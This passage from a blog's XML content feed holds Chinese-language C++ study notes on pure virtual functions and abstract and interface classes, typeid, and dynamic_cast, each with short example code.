      <link href="/2022/07/04/abstractclass/"/>
      <url>/2022/07/04/abstractclass/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>概念性的东西</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h2><p>像animal类，派生了dog和cat。<br>animal中有一个函数move，只不过肯定是在派生类里面实现才有意义，毕竟不同动物类肯定有区别。<br><code>virtual void move() = 0;</code></p><p><strong>注：virtual写在返回值前后问题不大看个人习惯。毕竟他又不能作为返回值，写前面只是更加显眼一点</strong></p><p>正常情况的虚函数<code>virtual void move()&#123;&#125;</code>或者<code>virtual void move();</code>，对于后者没有定义的话编译器一般都不会通过。<br>在加上<code>=0;</code>之后就是我们所说的纯虚函数。</p><p>为什么要用纯虚函数，是因为基类虽然用不到，但是派生类难免会用到。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">move</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span> : <span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">dog d1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/04/abstractclass/000.png" class=""><p>像这种声明了，但是没有定义，实例化内的时候就会报错。</p><p>而有的时候我们没打算给他做什么定义。也不想弄个空定义，就做成纯虚函数是最合适的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">move</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span> : <span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">dog d1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p><strong>广泛的定义就比较糙，拥有纯虚函数的类被称为抽象类，因为该类的函数没有任何实现。</strong><br>不过也是因为没有任何实现，所有不能实例化抽象类，只能使用抽象类的指针和引用作为返回或者参数。</p><ol><li>抽象类的构造函数因为不能实际使用，所以一般推荐把抽象类的构造函数定义为<code>protected</code></li><li>抽象类的派生类如果没有定义纯虚函数，则这个派生类也还是抽象类</li></ol><img src="/2022/07/04/abstractclass/001.png" class=""><p>代码是上面的，可以看到抽象类无法实例化。</p><p>最多就是指针或者引用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dog d1;</span><br><span class="line">animal *ami = &amp;d1;</span><br></pre></td></tr></table></figure><p>不过既然无法实例化抽象类了，他就建议你把抽象类的构造函数放到受保护区域。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="built_in">animal</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">move</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>前提构造函数有定义，没啥内容感觉也没必要这样写，反正终归是编程建议，而不是语法规范。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="built_in">animal</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">move</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fly</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span> : <span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>动物有飞禽走兽的说法，狗狗自然是地上跑的，所以没有对fly的定义，但是终归是继承的animal，派生类没有定义继承的顺序函数，也将是一个抽象类。</p><p>也就是dog也没法实例化了。</p><img src="/2022/07/04/abstractclass/002.png" class=""><hr><h2 id="接口类"><a href="#接口类" class="headerlink" title="接口类"></a>接口类</h2><p>指类中大部分都是定义为纯虚函数的类被称为接口类。<br>不过估计c#和java会比较多，c++毕竟是面向对象和面向过程结合体。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="built_in">animal</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">move</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fly</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">eat</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个概念比较直接哈哈</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>搞项目应该才用得到</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typeid</title>
      <link href="/2022/07/04/typeid/"/>
      <url>/2022/07/04/typeid/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当指向类的指针转换好几次的时候，人为看过去雀食很累了，就可以用<code>typeid</code>去看这个变量的类型。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">typeid</span>(a).<span class="built_in">name</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最直接的情况</p><img src="/2022/07/04/typeid/000.png" class=""><p>但是有个别变量的处理不是很好，比如long long</p><img src="/2022/07/04/typeid/001.png" class=""><p>他显示的是<code>__int64</code></p><p>还有的就是不是所有的编译器都默认打开这个功能。</p><hr><h2 id="检测多态类型"><a href="#检测多态类型" class="headerlink" title="检测多态类型"></a>检测多态类型</h2><h3 id="指针类型"><a href="#指针类型" class="headerlink" title="指针类型"></a>指针类型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> : <span class="keyword">public</span> father&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span>:<span class="keyword">public</span> son&#123;&#125;;</span><br></pre></td></tr></table></figure><p>设计三个类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">father *fa = <span class="keyword">new</span> <span class="built_in">father</span>();</span><br><span class="line">fa = <span class="keyword">new</span> <span class="built_in">grandson</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="built_in">typeid</span>(fa).<span class="built_in">name</span>();</span><br></pre></td></tr></table></figure><img src="/2022/07/04/typeid/002.png" class=""><p>看到返回的是类的指针类型，而不是正常的类型。<br>因为需要解除引用，转出类型。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">father *fa = <span class="keyword">new</span> <span class="built_in">father</span>();</span><br><span class="line">fa = <span class="keyword">new</span> <span class="built_in">grandson</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="built_in">typeid</span>(*fa).<span class="built_in">name</span>();</span><br></pre></td></tr></table></figure><img src="/2022/07/04/typeid/003.png" class=""><p>到此还不是最理想的类型显示。他显示的还是他最早声明的类型，但是我们new过之后，应该让他显示我们new之后的类型。</p><p>原因是类不支持多态，类型不会动态转换，所以往基类里面加个虚函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> : <span class="keyword">public</span> father&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span>:<span class="keyword">public</span> son&#123;&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/04/typeid/004.png" class=""><p>再次打印看到结果是我们最后一次new的类型了。</p><p><strong>注意要用星号解引用，不然还是它定义的类型</strong></p><hr><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father &amp;fa = s1;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">typeid</span>(fa).<span class="built_in">name</span>();</span><br></pre></td></tr></table></figure><img src="/2022/07/04/typeid/005.png" class=""><p>可以看到直接打印出了s1的类型。</p><p>并且修改成grandson也是没问题</p><img src="/2022/07/04/typeid/006.png" class=""><p>首先引用是个弱化的指针，它不需要像指针那样还要单独解引用。</p><hr><h2 id="无聊的比较"><a href="#无聊的比较" class="headerlink" title="无聊的比较"></a>无聊的比较</h2><p>估计会好奇typeid返回的是不是字符串，如果是也就能拿来和字符串比较。</p><img src="/2022/07/04/typeid/007.png" class=""><p>这样肯定是不合法的。</p><img src="/2022/07/04/typeid/008.png" class=""><p>可以看到显然typeid的返回值不会是const char。</p><p>那么最简单的就是两个typeid互相比较</p><img src="/2022/07/04/typeid/009.png" class=""><p>比较类型当然少不了类。</p><img src="/2022/07/04/typeid/010.png" class=""><img src="/2022/07/04/typeid/011.png" class=""><p>虽然name是const char*，但是和字符串比较没有结果，而且也不合适，还是直接调用现场的好了</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>typeid没啥问题，凑合用。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚函数dynamic_cast</title>
      <link href="/2022/07/03/purevirtualfunction/"/>
      <url>/2022/07/03/purevirtualfunction/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>dynamic_cast&lt;type&gt;()<br>动态转换只支持方法多态类型的指针，如果转换成功返回指针，失败则返回nullptr<br>同样分为两种情况：</p><ol><li>向下转换 downcast</li><li>跨类转换 crosscast</li></ol><p><strong>注：不要随便转换this指针</strong></p><span id="more"></span><p>还有一点，当dynamic_cast用于转换引用时，转换失败会抛出异常，所以一般不推荐转换引用</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wolf</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">werewolf</span> :<span class="keyword">public</span> wolf, <span class="keyword">public</span> pople&#123;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还是之前的例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father* fh = (father *)&amp;s1;</span><br><span class="line"></span><br><span class="line">son *s2 = <span class="built_in">static_cast</span>&lt;son *&gt;(fh);</span><br></pre></td></tr></table></figure><p>正常情况下我们知道静态转换可以这么操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father* fh = (father *)&amp;s1;</span><br><span class="line">fh = <span class="keyword">new</span> <span class="built_in">father</span>();</span><br><span class="line">son *s2 = <span class="built_in">static_cast</span>&lt;son *&gt;(fh);</span><br></pre></td></tr></table></figure><p>虽然强转，但是毕竟父类和子类结构不一样，指针的时候不是很理想。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">son *s2 = <span class="built_in">dynamic_cast</span>&lt;son *&gt;(fh);</span><br></pre></td></tr></table></figure><img src="/2022/07/03/purevirtualfunction/000.png" class=""><p>用动态转换的时候他要求类是一个多态类，那么在基类中加一个虚函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后编译就能通过了，对此是否完成转换，前面提到过转换成功返回指针，没成功返回nullptr。</p><img src="/2022/07/03/purevirtualfunction/001.png" class=""><p>显然是失败了，因为fh指针我们重新new了一个father类型。导致和son不同。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father* fh = (father *)&amp;s1;</span><br><span class="line"><span class="comment">//fh = new father();</span></span><br><span class="line">son *s2 = <span class="built_in">dynamic_cast</span>&lt;son *&gt;(fh);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s2 == <span class="literal">nullptr</span>) std::cout &lt;&lt; <span class="string">&quot;error!\n&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> std::cout &lt;&lt; <span class="string">&quot;success!\n&quot;</span>;</span><br></pre></td></tr></table></figure><img src="/2022/07/03/purevirtualfunction/002.png" class=""><p>当我们注释掉重新new的那句，fh仍然指向一个son类型的，那么它的指针信息就会和son有关。</p><hr><h2 id="不要过度依赖"><a href="#不要过度依赖" class="headerlink" title="不要过度依赖"></a>不要过度依赖</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">daughter</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后无脑为了转换基类指针，然后调用各自的move</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> sp = <span class="built_in">dynamic_cast</span>&lt;son *&gt;(fh);</span><br><span class="line"><span class="keyword">auto</span> du = <span class="built_in">dynamic_cast</span>&lt;daughter *&gt;(fh);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sp != <span class="literal">nullptr</span>) sp-&gt;<span class="built_in">Move</span>();</span><br><span class="line"><span class="keyword">if</span> (du != <span class="literal">nullptr</span>) du-&gt;<span class="built_in">Move</span>();</span><br></pre></td></tr></table></figure><p>这些全是下饭操作，这其实没有必要去做什么动态转换，直接在基类里面加一个虚函数，子类重写一下直接调用是最快的。</p><p><strong>不可取</strong></p><hr><h2 id="不要乱玩this指针"><a href="#不要乱玩this指针" class="headerlink" title="不要乱玩this指针"></a>不要乱玩this指针</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">dynamic_cast</span>&lt;father*&gt;(<span class="keyword">this</span>))</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>假设基类中有虚函数，它对this指针进行了一些操作，那么当派生类继承下来的时候，就全是在派生类上动手脚了，虽然语法规定没有限制不能转换this指针，但是不推荐这么操作，大多情况下人都把握不住。</p><hr><h2 id="强转指针和引用"><a href="#强转指针和引用" class="headerlink" title="强转指针和引用"></a>强转指针和引用</h2><p>之前说为了保证数据的完整，建议都是通过指针或者引用转换。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father* fh = (father *)&amp;s1;</span><br><span class="line">father &amp;fh1 = (father &amp;)s1;</span><br></pre></td></tr></table></figure><p>这两种强转都是没有什么问题的，引用本身就是弱化的指针。</p><p>而当使用<code>dynamic_cast</code>的时候，也是前面提到过的问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">son *s2 = <span class="built_in">dynamic_cast</span>&lt;son *&gt;(fh);</span><br><span class="line">daughter &amp;au = <span class="built_in">dynamic_cast</span>&lt;daughter &amp;&gt;(s1);</span><br></pre></td></tr></table></figure><p>当<code>dynamic_cast</code>去做引用的转换时，他如果出错了不是返回nullptr而是抛出异常。</p><img src="/2022/07/03/purevirtualfunction/003.png" class=""><p>在底层上，指针存在空指针，而引用没有空引用的说法。</p><hr><h2 id="跨类转换"><a href="#跨类转换" class="headerlink" title="跨类转换"></a>跨类转换</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//if(dynamic_cast&lt;father*&gt;(this))</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">daughter</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wolf</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">werewolf</span> :<span class="keyword">public</span> wolf, <span class="keyword">public</span> Box&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>构建一个新类box，他跟father之类的毫无关系，但是他被werewolf继承。</p><p>那么这个类还适合转换吗？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">werewolf wf;</span><br><span class="line">father *fa = (father *)&amp;wf;</span><br></pre></td></tr></table></figure><p>因为存在多重继承，向下继承的适合自己推敲有点麻烦，就看看动态能不能直接完成。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> p = <span class="built_in">dynamic_cast</span>&lt;Box *&gt;(fa);</span><br></pre></td></tr></table></figure><p>显然是可以的。</p><img src="/2022/07/03/purevirtualfunction/004.png" class=""><p>他是成功返回了一个指针，而不是nullptr。</p><p>那么在关联上</p><img src="/2022/07/03/purevirtualfunction/005.png" class=""><p>father和box是没有直接关系的，但是werewolf继承了这两个，因此包含了他俩的属性，所以werewolf可以主动转换成father和box类型。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>迷迷糊糊。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对象多态?</title>
      <link href="/2022/07/03/Polymorphic2/"/>
      <url>/2022/07/03/Polymorphic2/</url>
      
